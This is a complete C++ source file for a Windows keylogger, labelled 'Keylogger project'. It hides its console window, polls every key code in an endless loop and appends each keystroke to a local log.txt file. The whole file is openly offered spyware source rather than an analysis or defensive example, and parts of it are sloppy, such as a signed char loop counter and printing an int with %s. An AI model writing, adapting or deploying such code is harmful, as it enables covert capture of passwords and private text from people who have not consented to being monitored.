//Keylogger project
#include<iostream>
#include<windows.h>
#include<stdio.h>
using namespace std;
void out(char *filename,int key);
int main()
 {
 char i;
 FreeConsole();
     for(;;)
     {
         for(i=8;i<=255;i++)
         {
             if(GetAsyncKeyState(i)==-32767)
             {
                 out("log.txt",i);
             }
         }
     }
    return 0;
 }

void out(char *filename,int key)
{
   FILE*fp;
       fp=fopen(filename,"a+");
       if(key==VK_ESCAPE)
        fprintf(fp,"%s","[ESCAPE]");
       else if(key==VK_RETURN)
        fprintf(fp,"%s","[ENTER]");
       else if(key==VK_CONTROL)
        fprintf(fp,"%s","[CTRL]");
       else if(key==VK_SHIFT)
        fprintf(fp,"%s","[SHIFT]");
        else if(key==VK_TAB)
        fprintf(fp,"%s","[TAB]");
        else if(key==VK_UP)
        fprintf(fp,"%s","[UP]");
        else if(key==VK_DOWN)
        fprintf(fp,"%s","[DOWN]");
        else if(key==VK_RIGHT)
        fprintf(fp,"%s","[RIGHT]");
        else if(key==VK_LEFT)
        fprintf(fp,"%s","[LEFT]");
        else if(key==8)
        fprintf(fp,"%s","[BACKSPACE]");

       else
       fprintf(fp,"%s",&key);
       fclose(fp);
}
